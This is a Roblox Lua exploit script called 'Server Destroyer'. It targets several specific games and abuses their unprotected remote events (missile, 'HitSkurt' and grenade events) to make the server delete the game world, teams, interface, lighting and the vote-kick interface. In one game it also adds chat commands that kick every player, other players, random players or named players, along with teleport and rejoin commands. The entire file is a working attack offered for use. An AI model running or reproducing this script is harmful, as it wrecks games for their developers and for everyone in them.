if game.PlaceId == 11698235691 or game.PlaceId == 11940161478 or game.PlaceId == 12173240994 then
   game:GetService("StarterGui"):SetCore("SendNotification",
   {
      Title = "Server Destroyer",
      Text = "Loaded! Made by Gerashino#8015",
      Duration = 3
   }
   )
   local properties = {
      Color = Color3.new(12, 255, 0);
      Font = Enum.Font.FredokaOne;
      TextSize = 16;
   }
   properties.Text = "Server Destroyer. Made by Gerashino#8015"
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   properties.Text = "Use /cmds to see all the commands."
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   properties.Text = "Destroying Server..."
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   wait(1)
   for _,w in pairs(workspace:GetChildren()) do
      main = workspace
      file = w.Name

      allfnm = main[file]
      local args = {
         [1] = main,
         [2] = allfnm,
         [3] = 0,
         [4] = 0,
         [5] = 0,
         [6] = 0,
         [7] = 0,
         [8] = "",
         [9] = allfnm,
         [10] = main
      }

      game:GetService("ReplicatedStorage").AntiTankMissileFireEvent:FireServer(unpack(args))
   end
   for _,t in pairs(game.Teams:GetChildren()) do
      main = game.Teams
      file = t.Name

      allfnm = main[file]
      local args = {
         [1] = main,
         [2] = allfnm,
         [3] = 0,
         [4] = 0,
         [5] = 0,
         [6] = 0,
         [7] = 0,
         [8] = "",
         [9] = allfnm,
         [10] = main
      }

      game:GetService("ReplicatedStorage").AntiTankMissileFireEvent:FireServer(unpack(args))
   end

   main = game.ReplicatedStorage
   file = "VoteKickGui"

   allfnm = main[file]
   local args = {
      [1] = main,
      [2] = allfnm,
      [3] = 0,
      [4] = 0,
      [5] = 0,
      [6] = 0,
      [7] = 0,
      [8] = "",
      [9] = allfnm,
      [10] = main
   }

   game:GetService("ReplicatedStorage").AntiTankMissileFireEvent:FireServer(unpack(args))

   for _,script in pairs(game.ReplicatedFirst:GetChildren()) do
      main = game.ReplicatedFirst
      file = script.Name

      allfnm = main[file]
      local args = {
         [1] = main,
         [2] = allfnm,
         [3] = 0,
         [4] = 0,
         [5] = 0,
         [6] = 0,
         [7] = 0,
         [8] = "",
         [9] = allfnm,
         [10] = main
      }

      game:GetService("ReplicatedStorage").AntiTankMissileFireEvent:FireServer(unpack(args))
   end
   for _,gui in pairs(game.StarterGui:GetChildren()) do
      main = game.StarterGui
      file = gui.Name

      allfnm = main[file]
      local args = {
         [1] = main,
         [2] = allfnm,
         [3] = 0,
         [4] = 0,
         [5] = 0,
         [6] = 0,
         [7] = 0,
         [8] = "",
         [9] = allfnm,
         [10] = main
      }

      game:GetService("ReplicatedStorage").AntiTankMissileFireEvent:FireServer(unpack(args))
   end

   for _,l in pairs(game.Lighting:GetChildren()) do
      main = game.Lighting
      file = l.Name

      allfnm = main[file]
      local args = {
         [1] = main,
         [2] = allfnm,
         [3] = 0,
         [4] = 0,
         [5] = 0,
         [6] = 0,
         [7] = 0,
         [8] = "",
         [9] = allfnm,
         [10] = main
      }

      game:GetService("ReplicatedStorage").AntiTankMissileFireEvent:FireServer(unpack(args))
   end

   properties.Text = "Server has been successfully destroyed!"
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)

   function Teleport(params)
      if params[2] == "random" then
         local getrandom = math.random(1, #game.Players:GetPlayers())
         local getplr = game.Players:GetPlayers()[getrandom]
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[getplr.Name].Character.HumanoidRootPart.CFrame
         wait(1)
         local properties = {
            Color = Color3.new(12, 255, 0);
            Font = Enum.Font.FredokaOne;
            TextSize = 16;
         }
         properties.Text = "Teleporting to "..getplr.Name.."."
         game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      else
         for i,v in pairs(game.Players:GetPlayers()) do
            if v.Name:lower():sub(1,#params[2]) == params[2]:lower() then
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[v.Name].Character.HumanoidRootPart.CFrame
               wait(1)
               local properties = {
                  Color = Color3.new(12, 255, 0);
                  Font = Enum.Font.FredokaOne;
                  TextSize = 16;
               }
               properties.Text = "Teleporting to "..v.Name.."."
               game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
            end
         end
      end
   end

   function Rejoin()
      game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
      wait(1)
      local properties = {
         Color = Color3.new(12, 255, 0);
         Font = Enum.Font.FredokaOne;
         TextSize = 16;
      }
      properties.Text = "Rejoining..."
      game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   end

   function CommandsList()
      local properties = {
         Color = Color3.new(12, 255, 0);
         Font = Enum.Font.FredokaOne;
         TextSize = 16;
      }
      wait(1)
      properties.Text = "Commands:"
      game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      properties.Text = "/teleport [Player] (Aliases: tp, goto) - Teleports you to any player."
      game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      properties.Text = "/rejoin (Aliases: rj) - Rejoin."
      game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   end

   game.Players.LocalPlayer.Chatted:Connect(function(msg)
   local args = string.split(msg," ")
   local cmd = string.lower(args[1])
   if cmd == "/tp" or cmd == "/teleport" or cmd == "/goto" then
      Teleport(args)
   elseif cmd == "/cmds" or cmd == "/help" then
      CommandsList()
   elseif cmd == "/rejoin" or cmd == "/rj" then
      Rejoin()
   end
   end)
elseif game.PlaceId == 12015736082 then
   game:GetService("StarterGui"):SetCore("SendNotification",
   {
      Title = "Server Destroyer",
      Text = "Loaded! Made by Gerashino#8015",
      Duration = 3
   }
   )
   local properties = {
      Color = Color3.new(12, 255, 0);
      Font = Enum.Font.FredokaOne;
      TextSize = 16;
   }
   properties.Text = "Server Destroyer. Made by Gerashino#8015"
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   properties.Text = "Use /cmds to see all the commands."
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   properties.Text = "Destroying Server..."
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   wait(1)
   for _,w in pairs(workspace:GetChildren()) do
      local yeah = {
         [1] = w
      }

      game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
   end
   for _,t in pairs(game.Teams:GetChildren()) do
      local yeah = {
         [1] = t
      }

      game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
   end

   local yeah = {
      [1] = game.ReplicatedStorage.VoteKickGui
   }

   game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))

   for _,script in pairs(game.ReplicatedFirst:GetChildren()) do
      local yeah = {
         [1] = script
      }

      game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
   end
   for _,gui in pairs(game.StarterGui:GetChildren()) do
      local yeah = {
         [1] = gui
      }

      game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
   end

   for _,l in pairs(game.Lighting:GetChildren()) do
      local yeah = {
         [1] = l
      }

      game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
   end

   properties.Text = "Server has been successfully destroyed!"
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)

   local function findplr(plr)
      for i,v in pairs(game.Players:GetPlayers()) do
         if v.Name:lower():sub(1,#plr) == plr:lower() then
            return v;
         end
      end
      return nil
   end

   function Teleport(params)
      if params[2] == "random" then
         local getrandom = math.random(1, #game.Players:GetPlayers())
         local getplr = game.Players:GetPlayers()[getrandom]
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[getplr.Name].Character.HumanoidRootPart.CFrame
         wait(1)
         local properties = {
            Color = Color3.new(12, 255, 0);
            Font = Enum.Font.FredokaOne;
            TextSize = 16;
         }
         properties.Text = "Teleporting to "..getplr.Name.."."
         game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      else
         for i,v in pairs(game.Players:GetPlayers()) do
            if v.Name:lower():sub(1,#params[2]) == params[2]:lower() then
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[v.Name].Character.HumanoidRootPart.CFrame
               wait(1)
               local properties = {
                  Color = Color3.new(12, 255, 0);
                  Font = Enum.Font.FredokaOne;
                  TextSize = 16;
               }
               properties.Text = "Teleporting to "..v.Name.."."
               game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
            end
         end
      end
   end

   function Kick(pr)
      if pr[2] == "all" then
         for _,v in pairs(game.Players:GetPlayers()) do
            local yeah = {
               [1] = v
            }

            game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
         end
         wait(1)
         local properties = {
            Color = Color3.new(12, 255, 0);
            Font = Enum.Font.FredokaOne;
            TextSize = 16;
         }
         properties.Text = "Everyone has been kicked."
         game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      elseif pr[2] == "me" then
         local yeah = {
            [1] = game.Players.LocalPlayer
         }

         game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
         wait(1)
         local properties = {
            Color = Color3.new(12, 255, 0);
            Font = Enum.Font.FredokaOne;
            TextSize = 16;
         }
         properties.Text = "You have been kicked."
         game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      elseif pr[2] == "others" then
         for _,v in pairs(game.Players:GetPlayers()) do
            if game.Players.LocalPlayer.Name ~= v.Name then
               local yeah = {
                  [1] = v
               }

               game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
            end
         end
         wait(1)
         local properties = {
            Color = Color3.new(12, 255, 0);
            Font = Enum.Font.FredokaOne;
            TextSize = 16;
         }
         properties.Text = "Other Players were kicked."
         game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      elseif pr[2] == "random" then
         local getrandom = math.random(1, #game.Players:GetPlayers())
         local plr = game.Players:GetPlayers()[getrandom]
         wait(1)
         local properties = {
            Color = Color3.new(12, 255, 0);
            Font = Enum.Font.FredokaOne;
            TextSize = 16;
         }
         properties.Text = plr.Name.." has been kicked."
         game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
         local yeah = {
            [1] = plr
         }

         game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
      else
         local plr = findplr(pr[2])
         wait(1)
         local properties = {
            Color = Color3.new(12, 255, 0);
            Font = Enum.Font.FredokaOne;
            TextSize = 16;
         }
         properties.Text = plr.Name.." has been kicked."
         game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
         local yeah = {
            [1] = plr
         }

         game.ReplicatedStorage.HitSkurtEvent:FireServer(unpack(yeah))
      end
   end

   function Rejoin()
      game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
      wait(1)
      local properties = {
         Color = Color3.new(12, 255, 0);
         Font = Enum.Font.FredokaOne;
         TextSize = 16;
      }
      properties.Text = "Rejoining..."
      game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   end

   function CommandsList()
      local properties = {
         Color = Color3.new(12, 255, 0);
         Font = Enum.Font.FredokaOne;
         TextSize = 16;
      }
      wait(1)
      properties.Text = "Commands:"
      game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      properties.Text = "/kick [Player] (Aliases: k) - Kick player(s)."
      game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      properties.Text = "/teleport [Player] (Aliases: tp, goto) - Teleports you to any player."
      game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
      properties.Text = "/rejoin (Aliases: rj) - Rejoin."
      game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   end

   game.Players.LocalPlayer.Chatted:Connect(function(msg)
   local args = string.split(msg," ")
   local cmd = string.lower(args[1])
   if cmd == "/kick" or cmd == "/k" then
      Kick(args)
   elseif cmd == "/tp" or cmd == "/teleport" or cmd == "/goto" then
      Teleport(args)
   elseif cmd == "/cmds" or cmd == "/help" then
      CommandsList()
   elseif cmd == "/rejoin" or cmd == "/rj" then
      Rejoin()
   end
   end)
elseif game.PlaceId == 9329726891 then
   game:GetService("StarterGui"):SetCore("SendNotification",
   {
      Title = "Server Destroyer",
      Text = "Loaded! Made by Gerashino#8015",
      Duration = 3
   }
   )
   local properties = {
      Color = Color3.new(12, 255, 0);
      Font = Enum.Font.FredokaOne;
      TextSize = 16;
   }
   properties.Text = "Server Destroyer. Made by Gerashino#8015"
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   properties.Text = "Destroying Server..."
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
   wait(1)
   for _,w in pairs(workspace:GetChildren()) do
      local destroy = {
         [1] = w,
         [2] = 0,
         [3] = 0,
         [4] = 0
      }

      game:GetService("Lighting").ThrowGrenadeEvent:FireServer(unpack(destroy))
   end
   wait(1)
   for _,g in pairs(game.StarterGui:GetChildren()) do
      local destroy = {
         [1] = g,
         [2] = 0,
         [3] = 0,
         [4] = 0
      }

      game:GetService("Lighting").ThrowGrenadeEvent:FireServer(unpack(destroy))
   end
   wait(1)
   for _,t in pairs(game.Teams:GetChildren()) do
      local destroy = {
         [1] = t,
         [2] = 0,
         [3] = 0,
         [4] = 0
      }

      game:GetService("Lighting").ThrowGrenadeEvent:FireServer(unpack(destroy))
   end

   local destroy = {
      [1] = game.Lighting.Sky,
      [2] = 0,
      [3] = 0,
      [4] = 0
   }

   game:GetService("Lighting").ThrowGrenadeEvent:FireServer(unpack(destroy))

   properties.Text = "Server has been successfully destroyed!"
   game.StarterGui:SetCore("ChatMakeSystemMessage", properties)
end
